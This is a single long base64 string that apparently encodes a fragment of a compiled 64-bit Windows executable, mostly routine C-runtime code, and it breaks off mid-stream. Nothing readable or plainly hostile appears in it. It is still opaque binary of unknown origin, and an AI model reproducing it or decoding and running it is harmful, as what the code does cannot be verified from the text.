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0iLi+AAAADo6KP//0iLi+gAAADo3KP//0iLi/AAAADo0KP//0iLi/gAAADoxKP//0iLiwABAADouKP//0iLiwgBAADorKP//0iLixABAADooKP//0iLixgBAADolKP//0iLiyABAADoiKP//0iLiygBAADofKP//0iLizABAADocKP//0iLizgBAADoZKP//0iLi0ABAADoWKP//0iLi0gBAADoTKP//0iLi1ABAADoQKP//0iLi2gBAADoNKP//0iLi3ABAADoKKP//0iLi3gBAADoHKP//0iLi4ABAADoEKP//0iLi4gBAADoBKP//0iLi5ABAADo+KL//0iLi2ABAADo7KL//0iLi6ABAADo4KL//0iLi6gBAADo1KL//0iLi7ABAADoyKL//0iLi7gBAADovKL//0iLi8ABAADosKL//0iLi8gBAADopKL//0iLi5gBAADomKL//0iLi9ABAADojKL//0iLi9gBAADogKL//0iLi+ABAADodKL//0iLi+gBAADoaKL//0iLi/ABAADoXKL//0iLi/gBAADoUKL//0iLiwACAADoRKL//0iLiwgCAADoOKL//0iLixACAADoLKL//0iLixgCAADoIKL//0iLiyACAADoFKL//0iLiygCAADoCKL//0iLizACAADo/KH//0iLizgCAADo8KH//0iLi0ACAADo5KH//0iLi0gCAADo2KH//0iLi1ACAADozKH//0iLi1gCAADowKH//0iLi2ACAADotKH//0iLi2gCAADoqKH//0iLi3ACAADonKH//0iLi3gCAADokKH//0iLi4ACAADohKH//0iLi4gCAADoeKH//0iLi5ACAADobKH//0iLi5gCAADoYKH//0iLi6ACAADoVKH//0iLi6gCAADoSKH//0iLi7ACAADoPKH//0iLi7gCAADoMKH//0iDxCBbw8zMQFVBVEFVQVZBV0iD7FBIjWwkQEiJXUBIiXVISIl9UEiLBe7iAABIM8VIiUUIi11gM/9Ni+FFi+hIiVUAhdt+KkSL00mLwUH/ykA4OHQMSP/ARYXSdfBBg8r/i8NBK8L/yDvDjVgBfAKL2ESLdXiL90WF9nUHSIsBRItwBPedgAAAAESLy02LxBvSQYvOiXwkKIPiCEiJfCQg/8L/FaMxAABMY/iFwHUHM8Dp+QEAAEm48P///////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